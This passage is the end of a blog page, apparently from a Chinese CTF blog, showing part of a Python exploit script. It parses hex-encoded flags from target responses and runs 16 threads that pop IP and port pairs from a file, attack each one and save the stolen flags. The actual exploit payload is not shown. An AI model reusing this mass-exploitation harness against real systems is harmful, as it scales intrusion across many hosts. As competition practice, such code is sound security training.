style="color:#C99076">[0-9a-fA-F]</span><span style="color:#4C9A91">{2,}</span><span style="color:#666666">)</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> line</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            if</span><span style="color:#CB7676"> not</span><span style="color:#DBD7CAEE"> m</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">            hex_str </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> m</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">group</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">            try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                data </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> binascii</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">unhexlify</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">hex_str</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                return</span><span style="color:#DBD7CAEE"> data</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">errors</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">replace</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">rstrip</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            except</span><span style="color:#B8A965"> Exception</span><span style="color:#666666">:</span><br><span style="color:#4D9375">                return</span><span style="color:#4D9375"> None</span><br><br><span style="color:#DBD7CAEE">        flag </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> parse_hex_response</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">resp</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Extracted flag: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">flag</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        else</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">warning</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Failed to extract flag from response."</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> flag</span><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> exc</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">failure</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">ip</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">:</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">port</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] Exploit failed: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">exc</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> None</span><br><span style="color:#4D9375">    finally</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        try</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            if</span><span style="color:#DBD7CAEE"> tube</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                tube</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        except</span><span style="color:#B8A965"> Exception</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            pass</span><br><br><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><span style="color:#758575DD"># Worker：从文件中不断弹出 IP 并打</span><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> worker_thread</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">worker_id</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> filename</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flags_list</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flags_lock</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    while</span><span style="color:#4D9375"> True</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pop_one_ip</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> target </span><span style="color:#CB7676">is</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[worker </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">worker_id</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">] no more targets."</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            break</span><br><br><span style="color:#DBD7CAEE">        ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> target</span><br><span style="color:#DBD7CAEE">        flag </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pwn_target</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ip</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> port</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            with</span><span style="color:#DBD7CAEE"> flags_lock</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                flags_list</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><span style="color:#758575DD"># Main</span><br><span style="color:#758575DD"># ---------------------------------------------------------------------------</span><br><br><span style="color:#4D9375">if</span><span style="color:#B8A965"> __name__</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">__main__</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    filename </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">csnote_ips.txt</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">    flags </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    flags_lock </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Lock</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    max_workers </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 16</span><br><br><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Using </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">max_workers</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> workers with task file: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">filename</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">    with</span><span style="color:#DBD7CAEE"> ThreadPoolExecutor</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">max_workers</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">max_workers</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> executor</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        futures </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><br><span style="color:#DBD7CAEE">            executor</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">submit</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">worker_thread</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> filename</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flags</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flags_lock</span><span style="color:#4d9375">)</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">max_workers</span><span style="color:#4d9375">)</span><br><span style="color:#666666">        </span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> fut </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> as_completed</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">futures</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                fut</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> exc</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">failure</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[worker thread crashed] </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">exc</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#B8A965">    print</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Collected flags:</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> flag </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> flags</span><span style="color:#666666">:</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">    with</span><span style="color:#B8A965"> open</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">csnote_flags.txt</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">w</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> encoding</span><span style="color:#666666">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        for</span><span style="color:#DBD7CAEE"> flag </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> flags</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flag </span><span style="color:#CB7676">+</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>